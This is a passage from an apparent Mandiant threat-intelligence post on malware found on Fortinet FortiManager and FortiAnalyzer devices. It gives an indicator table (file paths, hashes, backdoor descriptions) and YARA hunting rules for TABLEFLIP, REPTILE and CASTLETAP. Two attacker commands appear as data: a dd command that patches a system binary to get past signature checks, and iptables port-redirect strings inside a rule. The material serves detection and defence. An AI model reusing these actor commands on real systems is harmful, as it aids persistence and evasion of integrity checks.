<tr style="height:143.979px">
<td colspan="2" style="border:1px solid #000000;padding:16px;width:10.581%;height:143.979px">
<p>Python Function</p>
</td>
<td style="border:1px solid #000000;padding:16px;width:57.0582%;height:143.979px">
<p>get_device_info</p>
</td>
<td style="border:1px solid #000000;padding:16px;width:32.3791%;height:143.979px">
<p>A malicious python function added to /usr/local/lib/python3.8/proj/util/views.py on FortiAnalyzer and FortiManager devices which provided threat actors with a persistent backdoor</p>
</td>
</tr>
<tr style="height:121.583px">
<td colspan="2" style="border:1px solid #000000;padding:16px;width:10.581%;height:121.583px">
<p>Filename</p>
</td>
<td style="border:1px solid #000000;padding:16px;width:57.0582%;height:121.583px">
<p>/bin/support</p>
</td>
<td style="border:1px solid #000000;padding:16px;width:32.3791%;height:121.583px">
<p>Threat actor script which launches /bin/auth (TABLEFLIP) and /bin/klogd (REPTILE) and deletes the two files along with /bin/support from disk</p>
</td>
</tr>
<tr style="height:121.583px">
<td colspan="2" style="border:1px solid #000000;padding:16px;width:10.581%;height:121.583px">
<p>Filename</p>
</td>
<td style="border:1px solid #000000;padding:16px;width:57.0582%;height:121.583px">
<p>/bin/auth</p>
</td>
<td style="border:1px solid #000000;padding:16px;width:32.3791%;height:121.583px">
<p>TABLEFLIP Sample - A passive utility to setup traffic redirection from a specific IP address destined to the FortiManager on TCP541 to another specified port.</p>
</td>
</tr>
<tr style="height:76.7917px">
<td colspan="2" style="border:1px solid #000000;padding:16px;width:10.581%;height:76.7917px">
<p>Filename</p>
</td>
<td style="border:1px solid #000000;padding:16px;width:57.0582%;height:76.7917px">
<p>/bin/klogd</p>
</td>
<td style="border:1px solid #000000;padding:16px;width:32.3791%;height:76.7917px">
<p>REPTILE - A backdoor utility that listens for a specialized packet for activation</p>
</td>
</tr>
<tr style="height:143.979px">
<td colspan="2" style="border:1px solid #000000;padding:16px;width:10.581%;height:143.979px">
<p>Config Change</p>
</td>
<td style="border:1px solid #000000;padding:16px;width:57.0582%;height:143.979px">
<p>printf &quot;t&quot; | dd of=/bin/smit bs=1 count=1 conv=notrunc seek=22866 2&gt;/dev/null</p>
</td>
<td style="border:1px solid #000000;padding:16px;width:32.3791%;height:143.979px">
<p>Config change made to /etc/init.d/localnet on FortiAnalyzer and FortiManager devices to revert a binary after it was modified to bypass digital signature verification of system files</p>
</td>
</tr>
<tr style="height:121.583px">
<td colspan="2" style="border:1px solid #000000;padding:16px;width:10.581%;height:121.583px">
<p>MD5</p>
</td>
<td style="border:1px solid #000000;padding:16px;width:57.0582%;height:121.583px">
<p>9ce2459168cf4b5af494776a70e0feda</p>
</td>
<td style="border:1px solid #000000;padding:16px;width:32.3791%;height:121.583px">
<p>Threat actor script which launches /bin/auth (TABLEFLIP) and /bin/klogd (REPTILE) and deletes the two files along with /bin/support from disk</p>
</td>
</tr>
<tr style="height:54.3958px">
<td colspan="2" style="border:1px solid #000000;padding:16px;width:10.581%;height:54.3958px">
<p>MD5</p>
</td>
<td style="border:1px solid #000000;padding:16px;width:57.0582%;height:54.3958px">
<p>b6e92149efaf78e9ce7552297505b9d5</p>
</td>
<td style="border:1px solid #000000;padding:16px;width:32.3791%;height:54.3958px">
<p>TABLEFLIP sample</p>
</td>
</tr>
<tr style="height:54.3958px">
<td colspan="2" style="border:1px solid #000000;padding:16px;width:10.581%;height:54.3958px">
<p>MD5</p>
</td>
<td style="border:1px solid #000000;padding:16px;width:57.0582%;height:54.3958px">
<p>53a69adac914808eced2bf8155a7512d</p>
</td>
<td style="border:1px solid #000000;padding:16px;width:32.3791%;height:54.3958px">
<p>REPTILE variant  sample</p>
</td>
</tr>
<tr style="height:54.3958px">
<td colspan="2" style="border:1px solid #000000;padding:16px;width:10.581%;height:54.3958px">
<p>MD5</p>
</td>
<td style="border:1px solid #000000;padding:16px;width:57.0582%;height:54.3958px">
<p>a388ebaef45add5da503e4bf2b9da546</p>
</td>
<td style="border:1px solid #000000;padding:16px;width:32.3791%;height:54.3958px">
<p>Modified /bin/smit</p>
</td>
</tr>
<tr style="height:54.3958px">
<td colspan="2" style="border:1px solid #000000;padding:16px;width:10.581%;height:54.3958px">
<p>MD5</p>
</td>
<td style="border:1px solid #000000;padding:16px;width:57.0582%;height:54.3958px">
<p>88711ebc99e1390f1ce2f42a6de0654d</p>
</td>
<td style="border:1px solid #000000;padding:16px;width:32.3791%;height:54.3958px">
<p>Localnet sample</p>
</td>
</tr>
<tr style="height:54.3958px">
<td colspan="2" style="border:1px solid #000000;padding:16px;width:10.581%;height:54.3958px">
<p>MD5</p>
</td>
<td style="border:1px solid #000000;padding:16px;width:57.0582%;height:54.3958px">
<p>e2d2884869f48f40b32fb27cc3bdefff</p>
</td>
<td style="border:1px solid #000000;padding:16px;width:32.3791%;height:54.3958px">
<p>CASTLETAP sample</p>
</td>
</tr>
<tr style="height:54.3958px">
<td colspan="2" style="border:1px solid #000000;padding:16px;width:10.581%;height:54.3958px">
<p>MD5</p>
</td>
<td style="border:1px solid #000000;padding:16px;width:57.0582%;height:54.3958px">
<p>53a69adac914808eced2bf8155a7512d</p>
</td>
<td style="border:1px solid #000000;padding:16px;width:32.3791%;height:54.3958px">
<p>REPTILE variant sample</p>
</td>
</tr>
<tr style="height:54.3958px">
<td colspan="2" style="border:1px solid #000000;padding:16px;width:10.581%;height:54.3958px">
<p>MD5</p>
</td>
<td style="border:1px solid #000000;padding:16px;width:57.0582%;height:54.3958px">
<p>64bdf7a631bc76b01b985f1d46b35ea6</p>
</td>
<td style="border:1px solid #000000;padding:16px;width:32.3791%;height:54.3958px">
<p>THINCRUST sample</p>
</td>
</tr>
<tr style="height:54.3958px">
<td colspan="2" style="border:1px solid #000000;padding:16px;width:10.581%;height:54.3958px">
<p>MD5</p>
</td>
<td style="border:1px solid #000000;padding:16px;width:57.0582%;height:54.3958px">
<p>a86a8fe875a89816e5808588154a067e</p>
</td>
<td style="border:1px solid #000000;padding:16px;width:32.3791%;height:54.3958px">
<p>THINCRUST sample</p>
</td>
</tr>
<tr style="height:54.3958px">
<td colspan="2" style="border:1px solid #000000;padding:16px;width:10.581%;height:54.3958px">
<p>MD5</p>
</td>
<td style="border:1px solid #000000;padding:16px;width:57.0582%;height:54.3958px">
<p>3e43511c4f7f551290292394c4e21de7</p>
</td>
<td style="border:1px solid #000000;padding:16px;width:32.3791%;height:54.3958px">
<p>Related to THINCRUST</p>
</td>
</tr>
<tr style="height:22.3958px">
<td colspan="2" style="border:1px solid #000000;padding:16px;width:10.581%;height:22.3958px">SHA1</td>
<td style="border:1px solid #000000;padding:16px;width:57.0582%;height:22.3958px">86f3623b3fb8d5303b6c9d8295292a5c2ceb2889</td>
<td style="border:1px solid #000000;padding:16px;width:32.3791%;height:22.3958px">Localnet sample</td>
</tr>
<tr style="height:54.3958px">
<td colspan="2" style="border:1px solid #000000;padding:16px;width:10.581%;height:54.3958px">
<p>SHA1</p>
</td>
<td style="border:1px solid #000000;padding:16px;width:57.0582%;height:54.3958px">
<p>75c092098e3409d366a46fdde6a92ff97d29cee1</p>
</td>
<td style="border:1px solid #000000;padding:16px;width:32.3791%;height:54.3958px">
<p>Smit sample</p>
</td>
</tr>
<tr style="height:54.3958px">
<td colspan="2" style="border:1px solid #000000;padding:16px;width:10.581%;height:54.3958px">
<p>SHA1</p>
</td>
<td style="border:1px solid #000000;padding:16px;width:57.0582%;height:54.3958px">
<p>9dca7f1af5752bb007e5cc55acd2511f03049ee5</p>
</td>
<td style="border:1px solid #000000;padding:16px;width:32.3791%;height:54.3958px">
<p>TABLEFLIP sample</p>
</td>
</tr>
<tr style="height:54.3958px">
<td colspan="2" style="border:1px solid #000000;padding:16px;width:10.581%;height:54.3958px">
<p>SHA1</p>
</td>
<td style="border:1px solid #000000;padding:16px;width:57.0582%;height:54.3958px">
<p>8c40fc87fa3b25a559585b10a8ca11c81fb09f75</p>
</td>
<td style="border:1px solid #000000;padding:16px;width:32.3791%;height:54.3958px">
<p>CASTLETAP sample</p>
</td>
</tr>
<tr style="height:54.3958px">
<td colspan="2" style="border:1px solid #000000;padding:16px;width:10.581%;height:54.3958px">
<p>SHA1</p>
</td>
<td style="border:1px solid #000000;padding:16px;width:57.0582%;height:54.3958px">
<p>3109b890901499f7ebb90f8870a7d1617d27e7c9</p>
</td>
<td style="border:1px solid #000000;padding:16px;width:32.3791%;height:54.3958px">
<p>REPTILE variant sample</p>
</td>
</tr>
<tr style="height:54.3958px">
<td colspan="2" style="border:1px solid #000000;padding:16px;width:10.581%;height:54.3958px">
<p>SHA1</p>
</td>
<td style="border:1px solid #000000;padding:16px;width:57.0582%;height:54.3958px">
<p>b8bdaa1bd204a6c710875b0c4265655d1fd37d52</p>
</td>
<td style="border:1px solid #000000;padding:16px;width:32.3791%;height:54.3958px">
<p>/bin/support sample</p>
</td>
</tr>
<tr style="height:54.3958px">
<td colspan="2" style="border:1px solid #000000;padding:16px;width:10.581%;height:54.3958px">
<p>SHA1</p>
</td>
<td style="border:1px solid #000000;padding:16px;width:57.0582%;height:54.3958px">
<p>1a077212735617a665a6b631e34a6aedcbc41713</p>
</td>
<td style="border:1px solid #000000;padding:16px;width:32.3791%;height:54.3958px">
<p>THINCRUST sample</p>
</td>
</tr>
<tr style="height:54.3958px">
<td colspan="2" style="border:1px solid #000000;padding:16px;width:10.581%;height:54.3958px">
<p>SHA1</p>
</td>
<td style="border:1px solid #000000;padding:16px;width:57.0582%;height:54.3958px">
<p>d5f8436e9815358e33b8243abda76c9b398943e2</p>
</td>
<td style="border:1px solid #000000;padding:16px;width:32.3791%;height:54.3958px">
<p>THINCRUST sample</p>
</td>
</tr>
<tr style="height:54.3958px">
<td colspan="2" style="border:1px solid #000000;padding:16px;width:10.581%;height:54.3958px">
<p>SHA1</p>
</td>
<td style="border:1px solid #000000;padding:16px;width:57.0582%;height:54.3958px">
<p>8ef5159944d048fe84e51a818c9b11ebcfa98517</p>
</td>
<td style="border:1px solid #000000;padding:16px;width:32.3791%;height:54.3958px">
<p>Related to THINCRUST</p>
</td>
</tr>
<tr style="height:54.3958px">
<td colspan="2" style="border:1px solid #000000;padding:16px;width:10.581%;height:54.3958px">
<p>SHA256</p>
</td>
<td style="border:1px solid #000000;padding:16px;width:57.0582%;height:54.3958px">
<p>245e4646e5d984c2da4cfe223bb2fae679441bcf42b254fc193ae97dc32af7ad</p>
</td>
<td style="border:1px solid #000000;padding:16px;width:32.3791%;height:54.3958px">
<p>Localnet sample</p>
</td>
</tr>
<tr style="height:54.3958px">
<td colspan="2" style="border:1px solid #000000;padding:16px;width:10.581%;height:54.3958px">
<p>SHA256</p>
</td>
<td style="border:1px solid #000000;padding:16px;width:57.0582%;height:54.3958px">
<p>9fb09fe6db61fbdd19ac9c368e2f64fb9606119649830762fa467719c480ed44</p>
</td>
<td style="border:1px solid #000000;padding:16px;width:32.3791%;height:54.3958px">
<p>Smit sample</p>
</td>
</tr>
<tr style="height:54.3958px">
<td colspan="2" style="border:1px solid #000000;padding:16px;width:10.581%;height:54.3958px">
<p>SHA256</p>
</td>
<td style="border:1px solid #000000;padding:16px;width:57.0582%;height:54.3958px">
<p>18afbad17dee0e4330a85b782e8e580c6125d8a7127cda69ad0e2728d505a6f5</p>
</td>
<td style="border:1px solid #000000;padding:16px;width:32.3791%;height:54.3958px">
<p>TABLEFLIP sample</p>
</td>
</tr>
<tr style="height:54.3958px">
<td colspan="2" style="border:1px solid #000000;padding:16px;width:10.581%;height:54.3958px">
<p>SHA256</p>
</td>
<td style="border:1px solid #000000;padding:16px;width:57.0582%;height:54.3958px">
<p>a00fed53b1ece4610c8b52934c20af3667d455f092a77f8d9bc46fdb9047e41a</p>
</td>
<td style="border:1px solid #000000;padding:16px;width:32.3791%;height:54.3958px">
<p>CASTLETAP sample</p>
</td>
</tr>
<tr style="height:54.3958px">
<td colspan="2" style="border:1px solid #000000;padding:16px;width:10.581%;height:54.3958px">
<p>SHA256</p>
</td>
<td style="border:1px solid #000000;padding:16px;width:57.0582%;height:54.3958px">
<p>eb6af99148f0ce5b58e414162ff2b7567b4cf08953862a088996365ff306014b</p>
</td>
<td style="border:1px solid #000000;padding:16px;width:32.3791%;height:54.3958px">
<p>REPTILE variant sample</p>
</td>
</tr>
<tr style="height:54.3958px">
<td colspan="2" style="border:1px solid #000000;padding:16px;width:10.581%;height:54.3958px">
<p>SHA256</p>
</td>
<td style="border:1px solid #000000;padding:16px;width:57.0582%;height:54.3958px">
<p>33c22b2db8c0948c67204485972d2eb856e13dca16132371337fc3534e3df16d</p>
</td>
<td style="border:1px solid #000000;padding:16px;width:32.3791%;height:54.3958px">
<p>/bin/support sample</p>
</td>
</tr>
<tr style="height:54.3958px">
<td colspan="2" style="border:1px solid #000000;padding:16px;width:10.581%;height:54.3958px">
<p>SHA256</p>
</td>
<td style="border:1px solid #000000;padding:16px;width:57.0582%;height:54.3958px">
<p>abefe121e5c895bf63be80152ccbe2d7bb5ad985aa3ab989bcb7c0804b90d004</p>
</td>
<td style="border:1px solid #000000;padding:16px;width:32.3791%;height:54.3958px">
<p>THINCRUST sample</p>
</td>
</tr>
<tr style="height:54.3958px">
<td colspan="2" style="border:1px solid #000000;padding:16px;width:10.581%;height:54.3958px">
<p>SHA256</p>
</td>
<td style="border:1px solid #000000;padding:16px;width:57.0582%;height:54.3958px">
<p>2266667af7532a32b9c21c330a9fe56356ca66610e39654804a7262f2af61017</p>
</td>
<td style="border:1px solid #000000;padding:16px;width:32.3791%;height:54.3958px">
<p>THINCRUST sample</p>
</td>
</tr>
<tr style="height:54.3958px">
<td colspan="2" style="border:1px solid #000000;padding:16px;width:10.581%;height:54.3958px">
<p>SHA256</p>
</td>
<td style="border:1px solid #000000;padding:16px;width:57.0582%;height:54.3958px">
<p>4e4c5e5ca588bd84b67a37b654ec522768fa83e535ff795a5c196da8f8b9737d</p>
</td>
<td style="border:1px solid #000000;padding:16px;width:32.3791%;height:54.3958px">
<p>Related to THINCRUST</p>
</td>
</tr>
</tbody>
</table></div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
<h2>YARA Rules</h2>
<pre><code>rule M_Hunting_Util_TABLEFLIP_1
{
meta:
    author = &quot;Mandiant&quot;
    description = &quot;Looks for TABLEFLIP Binary&quot;
    md5 = &quot;b6e92149efaf78e9ce7552297505b9d5&quot;
strings:
    $z1 = &quot;%1$s.*%2$d&quot; fullword
    $x1 = &quot;/proc/self/exe&quot; fullword
    $x2 = &quot;socket&quot; fullword
    $x3 = &quot;127.&quot; fullword
    $x4 = &quot;iptables -t nat&quot; fullword
    $s1 = &quot;iptables -t nat -S PREROUTING | grep %1$s | grep %2$d || iptables -t nat -A PREROUTING -p tcp -s %1$s --dport 541 -j REDIRECT --to-port %2$d&quot;
    $s2 = &quot;iptables -t nat -S PREROUTING | tail -n +2 | grep -n -E &#39;%1$s.*%2$d&#39; | awk -F: &#39;{print $1}&#39;| xargs iptables -t nat -D PREROUTING&quot;
condition:
    uint32(0) == 0x464c457f and filesize &lt; 5MB and @x1 &lt;= @x2 and @x2 &lt;= @x3 and @x3 &lt;= @x4 and ( $z1 or any of ($s*) )
}</code></pre>
<pre><code>rule M_Hunting_Backdoor_REPTILE_1
{
    meta:
        author = &quot;Mandiant&quot;
        description = &quot;Looks for ELF backdoor REPTILE variant&quot;
        md5 = &quot;53a69adac914808eced2bf8155a7512d&quot;
    strings:
        $x1 = &quot;;7(Zu9YTsA7qQ#vw&quot;
        $x2 = &quot;mznCvqSBo&quot;
        $x3 = &quot;hpaVAj2FJ&quot;
        $x4 = &quot;%d.%d.%d.%d&quot;
        $x5 = &quot;HISTFILE=&quot;
        $x6 = &quot;TERM&quot;
        $x7 = { 58 90 AE 86 F1 B9 1C F6 29 83 95 71 1D DE 58 0D } // taken from FE_Hunting_Linux_TINYSHELL_2_FEBeta.yara
    condition:
        uint32(0) == 0x464c457f and all of them and #x4 &gt;= 3 and #x6 == 1 and filesize &lt; 15MB
}</code></pre>
<pre><code>rule M_Hunting_Backdoor_CASTLETAP_1
{
    meta:
        author = &quot;Mandiant&quot;
        description = &quot;Finds strings observed in CASTLETOP ELF binary&quot;
        md5 = &quot;e2d2884869f48f40b32fb27cc3bdefff&quot;
    strings:
        $x1 = &quot;;7(Zu9YTsA7qQ#vw&quot;
        $x2 = &quot;qWWlC0v6yYh2yxu&quot;
        $x3 = &quot;1qaz@WSXa&quot;
        $x4 = &quot;hpaVAj2FJ&quot;
        $x5 = &quot;%d.%d.%d.%d&quot;
        $x6 = &quot;HISTFILE=&quot;
        $x7 = &quot;TERM&quot;
        $x8 = &quot;/tmp/busybox&quot;
        $x9 = { 58 90 AE 86 F1 B9 1C F6 29 83 95 71 1D DE 58 0D }
    condition:
        uint16(18) == 183 and
        uint16(16) == 0x02 and
        uint32(0) == 0x464c457f and 1 of ($x*) and #x5 &gt;= 3 and #x7 == 1 and filesize &lt; 15MB
}
rule M_Hunting_Backdoor_CASTLETAP_2
{
    meta:
        author = &quot;Mandiant&quot;
        description = &quot;Finds byte pattern related to XOR decode function&quot;
        md5 = &quot;e2d2884869f48f40b32fb27cc3bdefff&quot;
    strings:
        $x1 = { ?? 14 40 B9 ?? B0 1D 11 ?? 10 40 B9 [5] 0C 40 B9 [5] 1F 80 52 [9] 1F 00 12 }
    condition:
        uint16(18) == 183 and
        uint16(16) == 0x02 and
        uint32(0) == 0x464c457f and any of them and filesize &lt; 15MB        
}</code></pre></span></section><section class="kcBhad"><section class="Fabbec"><span class="WrMNjb">Posted in</span><ul class="FzXI4e"><li class="I4B51b"><a href="https://cloud.google.com/blog/topics/threat-intelligence" track-metadata-position="body"track-metadata-eventdetail="cloud.google.com/blog/topics/threat-intelligence"track-metadata-module="tag list"track-metadata-module_headline="posted in">Threat Intelligence</a></li><li class="I4B51b"><a href="https://cloud.google.com/blog/products/identity-security" track-metadata-position="body"track-metadata-eventdetail="cloud.google.com/blog/products/identity-security"track-metadata-module="tag list"track-metadata-module_headline="posted in">Security &amp; Identity</a></li></ul></section></section></div></div></div></div></div><section class="nRhiJb-DARUcf " track-metadata-module="related articles" track-metadata-module_headline="related articles"><div class="nRhiJb-DbgRPb-c5RTEf-ma6Yeb nRhiJb-DbgRPb-wNfPc-cGMI2b"><h5 class="Qwf2Db-MnozTc Qwf2Db-MnozTc-OWXEXe-MnozTc-wNfPc nRhiJb-DbgRPb-II5mzb-cGMI2b">Related articles</h5><section class="m9cUGf  HGev3   nJD2Qe  nRhiJb-ObfsIf"><div class="  QaGyvd  nRhiJb-kR0ZEf-OWXEXe-GV1x9e-c5RTEf nRhiJb-kR0ZEf-OWXEXe-GV1x9e-qWD73c-V2iZpe"><div class="mA0uBe"><a href="https://cloud.google.com/blog/topics/threat-intelligence/fortimanager-zero-day-exploitation-cve-2024-47575" class="lD2oe" track-name="investigating fortimanager zero-day exploitation (cve-2024-47575)"track-type="card"track-metadata-eventdetail="cloud.google.com/blog/topics/threat-intelligence/fortimanager-zero-day-exploitation-cve-2024-47575"><div class="AhkbS "><div class="hqnDEf"><section class="PBkdHd "><img class=" D5RK8d" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/threat-intelligence-default-banner-simplifie.max-700x700.png" alt="https://storage.googleapis.com/gweb-cloudblog-publish/images/threat-intelligence-default-banner-simplifie.max-700x700.png" loading="lazy"/></section></div><div class="JUOx5b"><div class="Qwf2Db-MnozTc Qwf2Db-MnozTc-OWXEXe-MnozTc-qWD73c nRhiJb-DbgRPb-c5RTEf-ma6Yeb nRhiJb-BFbNVe-r8s4j-bMElCd FI6Gl nRhiJb-fmcmS-oXtfBe" track-name="threat intelligence"track-type="tag">Threat Intelligence</div><h3 class="Qwf2Db-MnozTc HGFKtc Qwf2Db-MnozTc-OWXEXe-MnozTc-wNfPc">Investigating FortiManager Zero-Day Exploitation (CVE-2024-47575)</h3><p class="nRhiJb-cHYyed dTIXyb nRhiJb-DbgRPb-R6PoUb-ma6Yeb">By Mandiant  • 16-minute read</p></div></div></a></div></div><div class="  QaGyvd  nRhiJb-kR0ZEf-OWXEXe-GV1x9e-c5RTEf nRhiJb-kR0ZEf-OWXEXe-GV1x9e-qWD73c-V2iZpe"><div class="mA0uBe"><a href="https://cloud.google.com/blog/topics/threat-intelligence/time-to-exploit-trends-2023" class="lD2oe" track-name="how low can you go an analysis of 2023 time-to-exploit trends"track-type="card"track-metadata-eventdetail="cloud.google.com/blog/topics/threat-intelligence/time-to-exploit-trends-2023"><div class="AhkbS "><div class="hqnDEf"><section class="PBkdHd "><img class=" D5RK8d" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/threat-intelligence-default-banner-simplifie.max-700x700.png" alt="https://storage.googleapis.com/gweb-cloudblog-publish/images/threat-intelligence-default-banner-simplifie.max-700x700.png" loading="lazy"/></section></div><div class="JUOx5b"><div class="Qwf2Db-MnozTc Qwf2Db-MnozTc-OWXEXe-MnozTc-qWD73c nRhiJb-DbgRPb-c5RTEf-ma6Yeb nRhiJb-BFbNVe-r8s4j-bMElCd FI6Gl nRhiJb-fmcmS-oXtfBe" track-name="threat intelligence"track-type="tag">Threat Intelligence</div><h3 class="Qwf2Db-MnozTc HGFKtc Qwf2Db-MnozTc-OWXEXe-MnozTc-wNfPc">How Low Can You Go? An Analysis of 2023 Time-to-Exploit Trends</h3><p class="nRhiJb-cHYyed dTIXyb nRhiJb-DbgRPb-R6PoUb-ma6Yeb">By Mandiant  • 10-minute read</p></div></div></a></div></div><div class="  QaGyvd  nRhiJb-kR0ZEf-OWXEXe-GV1x9e-c5RTEf nRhiJb-kR0ZEf-OWXEXe-GV1x9e-qWD73c-V2iZpe"><div class="mA0uBe"><a href="https://cloud.google.com/blog/topics/threat-intelligence/capa-explorer-web-program-capability-analysis" class="lD2oe" track-name="capa explorer web: a web-based tool for program capability analysis"track-type="card"track-metadata-eventdetail="cloud.google.com/blog/topics/threat-intelligence/capa-explorer-web-program-capability-analysis"><div class="AhkbS "><div class="hqnDEf"><section class="PBkdHd "><img class=" D5RK8d" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/threat-intelligence-default-banner-simplifie.max-700x700.png" alt="https://storage.googleapis.com/gweb-cloudblog-publish/images/threat-intelligence-default-banner-simplifie.max-700x700.png" loading="lazy"/></section></div><div class="JUOx5b"><div class="Qwf2Db-MnozTc Qwf2Db-MnozTc-OWXEXe-MnozTc-qWD73c nRhiJb-DbgRPb-c5RTEf-ma6Yeb nRhiJb-BFbNVe-r8s4j-bMElCd FI6Gl nRhiJb-fmcmS-oXtfBe" track-name="threat intelligence"track-type="tag">Threat Intelligence</div><h3 class="Qwf2Db-MnozTc HGFKtc Qwf2Db-MnozTc-OWXEXe-MnozTc-wNfPc">capa Explorer Web: A Web-Based Tool for Program Capability Analysis</h3><p class="nRhiJb-cHYyed dTIXyb nRhiJb-DbgRPb-R6PoUb-ma6Yeb">By Mandiant  • 6-minute read</p></div></div></a></div></div><div class="  QaGyvd  nRhiJb-kR0ZEf-OWXEXe-GV1x9e-c5RTEf nRhiJb-kR0ZEf-OWXEXe-GV1x9e-qWD73c-V2iZpe"><div class="mA0uBe"><a href="https://cloud.google.com/blog/topics/threat-intelligence/lummac2-obfuscation-through-indirect-control-flow" class="lD2oe" track-name="lummac2: obfuscation through indirect control flow"track-type="card"track-metadata-eventdetail="cloud.google.com/blog/topics/threat-intelligence/lummac2-obfuscation-through-indirect-control-flow"><div class="AhkbS "><div class="hqnDEf"><section class="PBkdHd "><img class=" D5RK8d" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/threat-intelligence-default-banner-simplifie.max-700x700.png" alt="https://storage.googleapis.com/gweb-cloudblog-publish/images/threat-intelligence-default-banner-simplifie.max-700x700.png" loading="lazy"/></section></div><div class="JUOx5b"><div class="Qwf2Db-MnozTc Qwf2Db-MnozTc-OWXEXe-MnozTc-qWD73c nRhiJb-DbgRPb-c5RTEf-ma6Yeb nRhiJb-BFbNVe-r8s4j-bMElCd FI6Gl nRhiJb-fmcmS-oXtfBe" track-name="threat intelligence"track-type="tag">Threat Intelligence</div><h3 class="Qwf2Db-MnozTc HGFKtc Qwf2Db-MnozTc-OWXEXe-MnozTc-wNfPc">LummaC2: Obfuscation Through Indirect Control Flow</h3><p class="nRhiJb-cHYyed dTIXyb nRhiJb-DbgRPb-R6PoUb-ma6Yeb">By Mandiant  • 23-minute read</p></div></div></a></div></div></section></div></section></article></div></div><c-data id="i1" jsdata=" n2jFB;_;1"></c-data></c-wiz><script aria-hidden="true" nonce="wC8mBVAL5Ft29iPueo1EIg">window.wiz_progress&&window.wiz_progress();window.wiz_tick&&window.wiz_tick('zPZHOe');</script><script nonce="wC8mBVAL5Ft29iPueo1EIg">(function(){'use strict';var c=window,d=[];c.aft_counter=d;var e=[],f=0;function _recordIsAboveFold(a){if(!c._isLazyImage(a)&&!a.hasAttribute("data-noaft")&&a.src){var b=(c._isVisible||function(){})(c.document,a);a.setAttribute("data-atf",b);b&&(e.indexOf(a)!==-1||d.indexOf(a)!==-1||a.complete||d.push(a),a.hasAttribute("data-iml")&&(a=Number(a.getAttribute("data-iml")),a>f&&(f=a)))}}
c.initAft=function(){f=0;e=Array.prototype.slice.call(document.getElementsByTagName("img")).filter(function(a){return!!a.getAttribute("data-iml")});[].forEach.call(document.getElementsByTagName("img"),function(a){try{_recordIsAboveFold(a)}catch(b){throw b.message=a.hasAttribute("data-iid")?b.message+"\nrecordIsAboveFold error for defer inlined image":b.message+("\nrecordIsAboveFold error for img element with <src: "+a.src+">"),b;}});if(d.length===0)c.onaft(f)};}).call(this);
initAft()</script><script id="_ij" nonce="wC8mBVAL5Ft29iPueo1EIg">window.IJ_values = [[null,null,"",false,null,null,true,false],'0','https:\/\/cloud.google.com\/blog\/',["cloudblog","topics/threat-intelligence/fortinet-malware-ecosystem",["en","de","fr","ko","ja"],"en",null,"https://cloud.google.com/blog","blog_article","cloud.google.com",["https://console.cloud.google.com/freetrial/","https://cloud.google.com/contact/","https://cloud.google.com/","https://cloud.google.com/blog","https://cloud.google.com/","https://www.google.com/","https://cloud.google.com/products/","https://about.google.com/products/","https://about.google/intl/en/","https://support.google.com"],["googlecloud","googlecloud","showcase/google-cloud","googlecloud/","googlecloud/"],true], null ,'boq_cloudx-web-blog-uiserver_20241022.07_p0','cloud.google.com',["BR",3],[[["bigquery_ftv",["bigquery_ftv",[["control",["control",[97716263,97716264],["/bigquery"]]],["variantA",["variantA",[97716265,97716266],["/bigquery"]]],["variantB",["variantB",[97716267,97716268],["/bigquery"]]],["variantC",["variantC",[97716269,97716270],["/bigquery"]]]]]],["jss",["jss",[["control",["control",[93803230,93804391],["/products/ai","/products/compute","/solutions/web-hosting"]]],["variantA",["variantA",[93803231,93804392],["/products/ai","/products/compute","/solutions/web-hosting"]]],["variantB",["variantB",[93803232,93804393],["/products/ai","/products/compute","/solutions/web-hosting"]]],["variantC",["variantC",[93803233,93804394],["/products/ai","/products/compute","/solutions/web-hosting"]]]]]]]], 0.0 ,["GTM-5CVQBG",[["en","\u202aEnglish\u202c",true,"en"],["de","\u202aDeutsch\u202c",true,"de"],["es","\u202aEspañol\u202c",true,"es"],["es-419","\u202aEspañol (Latinoamérica)\u202c",true,"es-419"],["fr","\u202aFrançais\u202c",true,"fr"],["id","\u202aIndonesia\u202c",true,"id"],["it","\u202aItaliano\u202c",true,"it"],["pt-BR","\u202aPortuguês (Brasil)\u202c",true,"pt-BR"],["zh-CN","\u202a简体中文\u202c",true,"zh-Hans"],["zh-TW","\u202a繁體中文\u202c",true,"zh-Hant"],["ja","\u202a日本語\u202c",true,"ja"],["ko","\u202a한국어\u202c",true,"ko"]],["83405","AIzaSyD3LJeW4Q6gtdgJlyeFZUp-GhpIoc6EUeg"],"en",null,null,[],[["https://cloud.google.com/innovators","https://cloud.google.com/innovators/plus/activate","https://cloud.google.com/innovators/innovatorsplus"],["https://workspace.google.com/pricing","https://www.x.com/googleworkspace","https://www.facebook.com/googleworkspace","https://www.youtube.com/channel/UCBmwzQnSoj9b6HzNmFrg_yw","https://www.instagram.com/googleworkspace","https://www.linkedin.com/showcase/googleworkspace","https://about.google/?utm_source\u003dworkspace.google.com\u0026utm_medium\u003dreferral\u0026utm_campaign\u003dgsuite-footer-en","https://about.google/products/?tip\u003dexplore","https://workspace.google.com","https://workspace.google.com/contact/?source\u003dgafb-form-globalnav-en","https://workspace.google.com/business/signup/welcome?hl\u003den\u0026source\u003dgafb-form-globalnav-en","https://workspace.google.com/blog"],["https://www.cloudskillsboost.google","https://www.cloudskillsboost.google?utm_source\u003dcgc\u0026utm_medium\u003dwebsite\u0026utm_campaign\u003devergreen","https://www.cloudskillsboost.google/subscriptions?utm_source\u003dcgc\u0026utm_medium\u003dwebsite\u0026utm_campaign\u003devergreenlaunchpromo","https://www.cloudskillsboost.google/subscriptions?utm_source\u003dcgc\u0026utm_medium\u003dwebsite\u0026utm_campaign\u003devergreen","https://www.cloudskillsboost.google/catalog?utm_source\u003dcgc\u0026utm_medium\u003dwebsite\u0026utm_campaign\u003devergreen","https://www.cloudskillsboost.google/paths?utm_source\u003dcgc\u0026utm_medium\u003dwebsite\u0026utm_campaign\u003devergreen"],["https://mapsplatform.google.com"],["https://cloud.google.com/developers","https://cloud.google.com/developers/settings?utm_source\u003dinnovators"],["https://console.cloud.google.com/freetrial","https://console.cloud.google.com/","https://console.cloud.google.com/freetrial?redirectPath\u003dhttps://cloud.google.com/blog/topics/threat-intelligence/fortinet-malware-ecosystem/"],["https://aitestkitchen.withgoogle.com/signup","https://blog.google/technology/ai/join-us-in-the-ai-test-kitchen/","https://cloud.google.com/ai"],["https://googlecloudplatform.blogspot.com/","https://github.com/GoogleCloudPlatform","https://www.linkedin.com/co